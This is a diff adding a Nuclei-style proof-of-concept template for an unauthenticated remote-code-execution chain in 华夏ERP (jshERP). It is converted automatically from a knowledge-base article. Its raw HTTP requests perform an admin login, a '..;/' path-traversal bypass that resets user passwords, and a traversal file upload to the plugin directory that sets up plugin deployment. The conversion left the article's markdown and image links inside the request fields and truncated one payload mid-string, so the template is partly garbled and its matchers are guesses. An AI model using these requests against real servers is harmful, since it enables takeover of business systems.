@@ -1,0 +1,142 @@
+id: poc-gtt3ab4dyg2b5mbt
+info:
+  name: 华夏ERP全版本未授权RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gtt3ab4dyg2b5mbt
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gtt3ab4dyg2b5mbt
+http:
+- raw:
+  - 'POST /jshERP-boot/user/login HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    Content-Length: 67
+
+
+    Accept: application/json, text/plain, */*
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+
+    Content-Type: application/json;charset=UTF-8
+
+
+    Origin: [http://172.20.10.3:3000](http://172.20.10.3:3000)
+
+
+    Referer: [http://172.20.10.3:3000/user/login](http://172.20.10.3:3000/user/login)
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1724134392; HMACCOUNT=4FC1696FCCBA0C17; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1724138837
+
+
+    Connection: close
+
+
+
+
+    {"loginName":"admin","password":"e10adc3949ba59abbe56e057f20f883e"}
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1725844453555-b84f6a84-0391-4408-a756-758561b20416.png)
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1725844453836-5a3054e4-5d96-4f8f-878a-b7cf448e9630.png)
+
+
+    ### 权限绕过重置用户密码
+
+    /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/resetPwd
+
+
+
+
+    {"id":63}
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1725844454151-662ab8a5-a21f-4413-a4ce-76d2bb04db79.png)
+
+
+    ## 后台利用
+
+    超级管理员用户登陆后使用uploadPluginConfigFile接口创建../plugin目录，此目录创建后可部署插件。'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /jshERP-boot/plugin/uploadPluginConfigFile HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+
+    Accept: */*
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Content-Type: multipart/form-data; boundary=---------------------------64343665641219398361207370473
+
+
+    X-Access-Token: 90777cf909864636a458b05de1eab2a9_0
+
+
+    Content-Length: 247
+
+
+
+
+
+
+    -----------------------------64343665641219398361207370473
+
+
+    Content-Disposition: form-data; name="configFile"; filename="../plugins/success.txt"
+
+
+    Content-Type: text/plain
+
+
+
+
+    success
+
+
+
+
+    -----------------------------64343665641219398361207370473--
+
+
+    ![](https://c'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
